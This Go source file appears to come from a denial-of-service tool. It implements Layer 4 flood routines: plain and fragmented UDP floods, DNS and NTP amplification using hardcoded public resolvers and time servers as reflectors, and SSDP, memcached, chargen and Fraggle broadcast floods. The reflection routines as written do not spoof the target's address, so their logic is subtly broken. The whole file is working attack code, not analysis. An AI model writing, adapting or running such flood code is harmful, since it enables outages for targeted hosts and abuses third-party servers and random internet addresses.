package l4

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"time"

	"github.com/MatrixTM26/vsat/internal/methods"
	"github.com/MatrixTM26/vsat/internal/random"
)

var DNSReflectors = []string{
	"8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9",
	"208.67.222.222", "208.67.220.220", "64.6.64.6",
	"77.88.8.8", "94.140.14.14", "185.228.168.9",
}

var NTPReflectors = []string{
	"129.6.15.28", "129.6.15.29", "132.163.97.1",
	"132.163.97.2", "132.163.97.3",
}

var DNSDomains = []string{
	"google.com", "cloudflare.com", "amazon.com",
	"microsoft.com", "facebook.com", "youtube.com",
}

func BuildDNSQuery(Domain string) []byte {
	Buf := []byte{}
	ID := make([]byte, 2)
	binary.BigEndian.PutUint16(ID, uint16(rand.Intn(65535)))
	Buf = append(Buf, ID...)
	Buf = append(Buf, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
	Start := 0
	for I := 0; I <= len(Domain); I++ {
		if I == len(Domain) || Domain[I] == '.' {
			Part := Domain[Start:I]
			Buf = append(Buf, byte(len(Part)))
			Buf = append(Buf, []byte(Part)...)
			Start = I + 1
		}
	}
	Buf = append(Buf, 0x00, 0x00, 0xff, 0x00, 0x01)
	return Buf
}

func BuildNTPMonlist() []byte {
	Pkt := make([]byte, 48)
	Pkt[0] = 0x17
	Pkt[1] = 0x00
	Pkt[2] = 0x03
	Pkt[3] = 0x2a
	return Pkt
}

func BuildSSDPSearch(Target string) []byte {
	Msg := fmt.Sprintf(
		"M-SEARCH * HTTP/1.1\r\n"+
			"HOST: %s:1900\r\n"+
			"MAN: \"ssdp:discover\"\r\n"+
			"ST: ssdp:all\r\n"+
			"MX: 1\r\n\r\n",
		Target,
	)
	return []byte(Msg)
}

func BuildMemcachedStats() []byte {
	return []byte{
		0x00, 0x01, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
	}
}

func BuildChargen() []byte {
	Payload := make([]byte, 1400)
	for I := range Payload {
		Payload[I] = byte(random.RandomInt(33, 126))
	}
	return Payload
}

func UDPExecutor(Cfg *methods.Config, Stop <-chan struct{}) {
	Addr := fmt.Sprintf("%s:%d", Cfg.IP, Cfg.Port)
	for {
		select {
		case <-Stop:
			return
		default:
		}
		Conn, Err := net.DialTimeout("udp", Addr, 3*time.Second)
		if Err != nil {
			continue
		}
		Payload := random.RandomBytes(random.RandomInt(512, 65500))
		N, Err := Conn.Write(Payload)
		Conn.Close()
		if Err == nil {
			Cfg.Stats.RequestsCount.Add(1)
			Cfg.Stats.BytesSent.Add(int64(N))
		}
	}
}

func UDPFragExecutor(Cfg *methods.Config, Stop <-chan struct{}) {
	Addr := fmt.Sprintf("%s:%d", Cfg.IP, Cfg.Port)
	FragSize := 1400
	for {
		select {
		case <-Stop:
			return
		default:
		}
		Conn, Err := net.DialTimeout("udp", Addr, 3*time.Second)
		if Err != nil {
			continue
		}
		Total := random.RandomInt(8192, 65535)
		Sent := 0
		for Sent < Total {
			End := Sent + FragSize
			if End > Total {
				End = Total
			}
			Chunk := random.RandomBytes(End - Sent)
			N, Err := Conn.Write(Chunk)
			if Err != nil {
				break
			}
			Cfg.Stats.BytesSent.Add(int64(N))
			Sent = End
		}
		Conn.Close()
		Cfg.Stats.RequestsCount.Add(1)
	}
}

func DNSAMPExecutor(Cfg *methods.Config, Stop <-chan struct{}) {
	for {
		select {
		case <-Stop:
			return
		default:
		}
		Reflector := DNSReflectors[rand.Intn(len(DNSReflectors))]
		Addr := fmt.Sprintf("%s:53", Reflector)
		Query := BuildDNSQuery(DNSDomains[rand.Intn(len(DNSDomains))])
		Conn, Err := net.DialTimeout("udp", Addr, 3*time.Second)
		if Err != nil {
			continue
		}
		N, Err := Conn.Write(Query)
		Conn.Close()
		if Err == nil {
			Cfg.Stats.RequestsCount.Add(1)
			Cfg.Stats.BytesSent.Add(int64(N))
		}
	}
}

func NTPAMPExecutor(Cfg *methods.Config, Stop <-chan struct{}) {
	Pkt := BuildNTPMonlist()
	for {
		select {
		case <-Stop:
			return
		default:
		}
		Reflector := NTPReflectors[rand.Intn(len(NTPReflectors))]
		Addr := fmt.Sprintf("%s:123", Reflector)
		Conn, Err := net.DialTimeout("udp", Addr, 3*time.Second)
		if Err != nil {
			continue
		}
		N, Err := Conn.Write(Pkt)
		Conn.Close()
		if Err == nil {
			Cfg.Stats.RequestsCount.Add(1)
			Cfg.Stats.BytesSent.Add(int64(N))
		}
	}
}

func SSDAMPExecutor(Cfg *methods.Config, Stop <-chan struct{}) {
	Payload := BuildSSDPSearch(Cfg.IP)
	for {
		select {
		case <-Stop:
			return
		default:
		}
		Addr := fmt.Sprintf("%s:1900", random.RandomIP())
		Conn, Err := net.DialTimeout("udp", Addr, 3*time.Second)
		if Err != nil {
			continue
		}
		N, Err := Conn.Write(Payload)
		Conn.Close()
		if Err == nil {
			Cfg.Stats.RequestsCount.Add(1)
			Cfg.Stats.BytesSent.Add(int64(N))
		}
	}
}

func MEMCACHEDExecutor(Cfg *methods.Config, Stop <-chan struct{}) {
	Payload := BuildMemcachedStats()
	for {
		select {
		case <-Stop:
			return
		default:
		}
		Addr := fmt.Sprintf("%s:11211", random.RandomIP())
		Conn, Err := net.DialTimeout("udp", Addr, 3*time.Second)
		if Err != nil {
			continue
		}
		N, Err := Conn.Write(Payload)
		Conn.Close()
		if Err == nil {
			Cfg.Stats.RequestsCount.Add(1)
			Cfg.Stats.BytesSent.Add(int64(N))
		}
	}
}

func CHARGENExecutor(Cfg *methods.Config, Stop <-chan struct{}) {
	for {
		select {
		case <-Stop:
			return
		default:
		}
		Addr := fmt.Sprintf("%s:19", random.RandomIP())
		Conn, Err := net.DialTimeout("udp", Addr, 3*time.Second)
		if Err != nil {
			continue
		}
		Payload := BuildChargen()
		N, Err := Conn.Write(Payload)
		Conn.Close()
		if Err == nil {
			Cfg.Stats.RequestsCount.Add(1)
			Cfg.Stats.BytesSent.Add(int64(N))
		}
	}
}

func FRAGGLEExecutor(Cfg *methods.Config, Stop <-chan struct{}) {
	Payload := []byte("FRAGGLE")
	for {
		select {
		case <-Stop:
			return
		default:
		}
		Addr := fmt.Sprintf("255.255.255.255:%d", random.RandomInt(1, 1024))
		Conn, Err := net.DialTimeout("udp", Addr, 3*time.Second)
		if Err != nil {
			continue
		}
		N, Err := Conn.Write(Payload)
		Conn.Close()
		if Err == nil {
			Cfg.Stats.RequestsCount.Add(1)
			Cfg.Stats.BytesSent.Add(int64(N))
		}
	}
}
